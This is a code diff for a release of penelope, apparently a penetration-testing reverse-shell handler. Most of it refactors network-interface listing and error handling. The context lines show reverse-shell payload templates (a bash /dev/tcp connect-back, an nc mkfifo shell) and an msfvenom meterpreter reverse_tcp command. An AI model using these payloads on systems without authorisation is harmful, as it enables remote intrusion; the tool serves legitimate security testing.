@@ -16,7 +16,7 @@
 # along with this program.  If not, see <https://www.gnu.org/licenses/>.
 
 __program__= "penelope"
-__version__ = "0.20.3"
+__version__ = "0.20.4"
 
 import os
 import io
@@ -86,7 +86,7 @@ def Open(item, terminal=False):
 		args = [item]
 	elif myOS == 'Darwin':
 		try:
-			fd, cmd_path = tempfile.mkstemp(prefix='penelope-', suffix='.command', dir=options.basedir)
+			fd, cmd_path = tempfile.mkstemp(prefix='penelope-', suffix='.command')
 			with os.fdopen(fd, 'w') as f:
 				f.write(f"#!/bin/sh\n{item}\n")
 			os.chmod(cmd_path, 0o700)
@@ -131,17 +131,20 @@ def Open(item, terminal=False):
 
 
 class Interfaces:
-
 	def __str__(self):
 		table = Table(joinchar=' : ')
 		table.header = [paint('Interface').MAGENTA, paint('IP Address').MAGENTA]
-		for name, ip in self.list.items():
-			table += [paint(name).cyan, paint(ip).yellow]
+		grouped = {}
+		for name, ip in self.pairs:
+			grouped.setdefault(name, []).append(ip)
+		for name, ips in grouped.items():
+			table += [paint(name).cyan, paint(', '.join(ips)).yellow]
 		return str(table)
 
 	def translate(self, interface_name):
-		if interface_name in self.list:
-			return self.list[interface_name]
+		interfaces = self.list
+		if interface_name in interfaces:
+			return interfaces[interface_name]
 		elif interface_name in ('any', 'all'):
 			return '0.0.0.0'
 		else:
@@ -154,42 +157,77 @@ class Interfaces:
 		params = ['ip', 'addr']
 		if busybox:
 			params.insert(0, 'busybox')
-		for line in subprocess.check_output(params).decode().splitlines():
-			interface = re.search(r"^\d+: (.+?):", line)
+		try:
+			output = subprocess.check_output(params, stderr=subprocess.DEVNULL).decode()
+		except (subprocess.CalledProcessError, OSError):
+			return interfaces
+		for line in output.splitlines():
+			interface = re.search(r"^\d+:\s+(.+?)(?:@\w+)?:", line)
 			if interface:
 				current_interface = interface[1]
 				continue
 			if current_interface:
-				ip = re.search(r"inet (\d+\.\d+\.\d+\.\d+)", line)
+				ip = re.search(r"\binet (\d+\.\d+\.\d+\.\d+)", line)
 				if ip:
 					interfaces.append((current_interface, ip[1]))
-					current_interface = None # TODO support multiple IPs in one interface
 		return interfaces
 
 	@staticmethod
 	def ifconfig():
-		output = subprocess.check_output(['ifconfig']).decode()
-		return re.findall(r'^(\w+).*?\n\s+inet (?:addr:)?(\d+\.\d+\.\d+\.\d+)', output, re.MULTILINE | re.DOTALL)
+		interfaces = []
+		try:
+			output = subprocess.check_output(['ifconfig'], stderr=subprocess.DEVNULL).decode()
+		except (subprocess.CalledProcessError, OSError):
+			return interfaces
+		current_interface = None
+		for line in output.splitlines():
+			if line and not line[0].isspace():
+				header = re.match(r'(\S+?):?\s', line)
+				current_interface = header[1] if header else None
+			elif current_interface:
+				ip = re.search(r'\binet (?:addr:)?(\d+\.\d+\.\d+\.\d+)', line)
+				if ip:
+					interfaces.append((current_interface, ip[1]))
+		return interfaces
+
+	@property
+	def pairs(self):
+		if shutil.which("ip"):
+			return self.ipa()
+		elif shutil.which("ifconfig"):
+			return self.ifconfig()
+		elif shutil.which("busybox"):
+			return self.ipa(busybox=True)
+		logger.error("'ip', 'ifconfig' and 'busybox' commands are not available. (Really???)")
+		return []
 
 	@property
 	def list(self):
-		if shutil.which("ip"):
-			interfaces = self.ipa()
+		result = {}
+		for name, ip in self.pairs:
+			result.setdefault(name, ip)
+		return result
 
-		elif shutil.which("ifconfig"):
-			interfaces = self.ifconfig()
-
-		elif shutil.which("busybox"):
-			interfaces = self.ipa(busybox=True)
-		else:
-			logger.error("'ip', 'ifconfig' and 'busybox' commands are not available. (Really???)")
-			return dict()
-
-		return {i[0]:i[1] for i in interfaces}
+	@property
+	def ips(self):
+		seen = set()
+		result = []
+		for _, ip in self.pairs:
+			if ip not in seen:
+				seen.add(ip)
+				result.append(ip)
+		return result
 
 	@property
 	def list_all(self):
-		return [item for item in list(self.list.keys()) + list(self.list.values())]
+		seen = set()
+		result = []
+		for name, ip in self.pairs:
+			for item in (name, ip):
+				if item not in seen:
+					seen.add(item)
+					result.append(item)
+		return result
 
 
 class Table:
@@ -452,7 +490,7 @@ class CustomFormatter(logging.Formatter):
 		suffix = "\r\n"
 
 		if core.wait_input:
-			suffix += bytes(core.output_line_buffer).decode() + readline.get_line_buffer()
+			suffix += bytes(core.output_line_buffer).decode() + (readline.get_line_buffer() if readline else '')
 
 		elif core.attached_session:
 			suffix += bytes(core.output_line_buffer).decode()
@@ -1732,10 +1770,10 @@ class Core:
 
 						readable.record(shell_output)
 
-						if b'\x1b[?1049h' in data:
+						if b'\x1b[?1049h' in shell_output:
 							readable.alternate_buffer = True
 
-						if b'\x1b[?1049l' in data:
+						if b'\x1b[?1049l' in shell_output:
 							readable.alternate_buffer = False
 						#if readable.subtype == 'cmd' and self._cmd == data:
 						#	data, self._cmd = b'', b'' # TODO
@@ -1885,6 +1923,8 @@ class TCPListener:
 
 		if self.bind(self.host, self.port):
 			self.start()
+		else:
+			self.socket.close()
 
 	def __str__(self):
 		return f"TCPListener({self.host}:{self.port})"
@@ -1903,7 +1943,7 @@ class TCPListener:
 	def start(self):
 		specific = ""
 		if self.host == '0.0.0.0':
-			specific = paint('-> ').cyan + str(paint(' • ').cyan).join([str(paint(ip).cyan) for ip in Interfaces().list.values()])
+			specific = paint('-> ').cyan + str(paint(' • ').cyan).join([str(paint(ip).cyan) for ip in Interfaces().ips])
 
 		logger.info(f"Listening for reverse shells on {paint(self.host).blue}{paint(':').white}{paint(self.port).orange} {specific}")
 
@@ -1942,7 +1982,8 @@ class TCPListener:
 			logger.warning(f"Stopping {self}")
 
 	def payloads(self, interface_filter=None):
-		interfaces = Interfaces().list
+		pairs = Interfaces().pairs
+		name_of_ip = {ip: name for name, ip in pairs}
 		presets = [
 			"(bash >& /dev/tcp/{}/{} 0>&1) &",
 			"(rm /tmp/_;mkfifo /tmp/_;cat /tmp/_|sh 2>&1|nc {} {} >/tmp/_) >/dev/null 2>&1 &",
@@ -1954,7 +1995,7 @@ class TCPListener:
 		ips = [self.host]
 
 		if self.host == '0.0.0.0':
-			ips = [ip for ip in interfaces.values()]
+			ips = [ip for _, ip in pairs]
 		if self.jump:
 			ips[:0] = self.jump
 
@@ -1965,7 +2006,7 @@ class TCPListener:
 				iface_name = paint('JUMP').RED
 			else:
 				port = self.port
-				iface_name = {v: k for k, v in interfaces.items()}.get(ip)
+				iface_name = name_of_ip.get(ip)
 				if interface_filter and iface_name != interface_filter:
 					continue
 				iface_name = paint(iface_name).GREEN_black
@@ -2694,8 +2735,22 @@ class Session:
 				if not agent_control:
 					agent_control = self.subchannel.control # TEMP
 				rlist.append(agent_control)
+
+				def _selectable(x):
+					try:
+						select([x], [], [], 0)
+						return True
+					except (ValueError, OSError):
+						return False
 				while rlist != [agent_control]:
-					r, _, _ = select(rlist, [], [], timeout)
+					try:
+						r, _, _ = select(rlist, [], [], timeout)
+					except (ValueError, OSError):
+						rlist = [x for x in rlist if _selectable(x)]
+						if not rlist or rlist == [agent_control]:
+							break
+						continue
+
 					timeout = None
 
 					if not r:
@@ -3825,7 +3880,7 @@ class Session:
 				logger.error("No shebang found")
 				return False
 
-			tail_cmd = f'tail -n+0 -f {output_file_name}'
+			tail_cmd = f'tail -n +1 -f {shlex.quote(str(output_file_name))}'
 			print(tail_cmd)
 			Open(tail_cmd, terminal=True)
 
@@ -4730,7 +4785,8 @@ class uac(Module):
 				return False
 		#	UAC artifacts or profiles can be set by changing the arguments, e.g.:  /uac -u -a './artifacts/live_response/network*' --output-format tar {session.tmp}
 			logger.info(f"root user check is disabled. Data collection may be limited. It will WRITE the output on the remote file system.")
-			cmd = f"cd {path.removesuffix('.tar.gz')}; ./uac -u -p ir_triage --output-format tar {session.tmp}"
+			base = re.sub(r'\.tar\.gz$', '', path)
+			cmd = f"cd {base}; ./uac -u -p ir_triage --output-format tar {session.tmp}"
 			#session.exec(cmd)
 			tf = f"/tmp/{rand(8)}"
 			with open(tf, "w") as f:
@@ -4968,7 +5024,7 @@ class meterpreter(Module):
 				payload_creation_cmd = ["msfvenom", "-p", f"windows/{arch}meterpreter/reverse_tcp", f"LHOST={host}", f"LPORT={port}", "-f", "exe", "-o", payload_path]
 
 				print(payload_creation_cmd)
-				result = subprocess.run(payload_creation_cmd, text=True, capture_output=True)
+				result = subprocess.run(payload_creation_cmd, universal_newlines=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 
 				if result.returncode == 0:
 					logger.info("Payload created!")
@@ -5085,7 +5141,7 @@ class FileServer:
 		ips = [self.host]
 
 		if self.host == '0.0.0.0':
-			ips = [ip for ip in Interfaces().list.values()]
+			ips = Interfaces().ips
 
 		for ip in ips:
 			output.extend(('', f'{EMOJIS["home"]} http://' + str(paint(ip).cyan) + ":" + str(paint(self.port).orange) + '/' + self.url_prefix))
@@ -5138,7 +5194,7 @@ class FileServer:
 						from html import escape
 						response = ''
 						for path in filemap.keys():
-							safe_path = html.escape(path)
+							safe_path = escape(path)
 							response += f'<li><a href="{safe_path}">{safe_path}</a></li>'
 						response = response.encode()
 						self.send_response(200)
@@ -5174,7 +5230,7 @@ class FileServer:
 					return None
 				message = format % args
 				response = message.translate(self._control_char_table).split(' ')
-				if not response[0].startswith('"'):
+				if len(response) < 4 or not response[0].startswith('"'):
 					return
 				if response[3][0] == '3':
 					color = 'yellow'
@@ -5442,20 +5498,6 @@ def load_rc():
 		RC.touch()
 	os.chmod(RC, 0o600)
 
-def emojis_installed():
-	if myOS == "Darwin":
-		return True
-	try:
-		result = subprocess.run(
-			["fc-list", ":charset=1F480"],  # 1F480 = Skull emoji
-			stdout=subprocess.PIPE,
-			stderr=subprocess.PIPE,
-			text=True
-		)
-		return bool(result.stdout)
-	except:
-		pass
-
 # OPTIONS
 class Options:
 	log_levels = {"silent":'WARNING', "debug":'DEBUG'}
@@ -5500,6 +5542,7 @@ class Options:
 		self.useragent = "Wget/1.21.2"
 		self.upload_random_suffix = False
 		self.attach_lines = 20
+		self.emojis = True
 
 	def __getattribute__(self, option):
 		if option in ("logfile", "debug_logfile", "cmd_histfile", "debug_histfile"):
@@ -5554,6 +5597,12 @@ class Options:
 
 		elif option == 'basedir':
 			value.mkdir(parents=True, exist_ok=True)
+
+		elif option == 'emojis':
+			global EMOJIS
+			if '_EMOJIS_FULL' in globals():
+				EMOJIS = _EMOJIS_FULL if value else defaultdict(str)
+
 
 		if hasattr(self, option) and getattr(self, option) is not None:
 			new_value_type = type(value).__name__
@@ -5834,7 +5883,10 @@ signal.signal(signal.SIGWINCH, WinResize)
 keyboard_interrupt = signal.getsignal(signal.SIGINT)
 try:
 	import readline
-	readline.parse_and_bind("tab: complete")
+	if getattr(readline, 'backend', '') == 'editline' or 'libedit' in (readline.__doc__ or ''):
+		readline.parse_and_bind("bind ^I rl_complete")
+	else:
+		readline.parse_and_bind("tab: complete")
 	default_readline_delims = readline.get_completer_delims()
 except ImportError:
 	readline = None
@@ -5846,9 +5898,8 @@ menu = MainMenu(histfile=options.cmd_histfile, histlen=options.histlength)
 start = menu.start
 Listener = TCPListener
 
-# Check for installed emojis
-if not emojis_installed():
-	logger.warning("Emojis disabled")
+_EMOJIS_FULL = EMOJIS
+if not options.emojis:
 	EMOJIS = defaultdict(str)
 
 # Load peneloperc
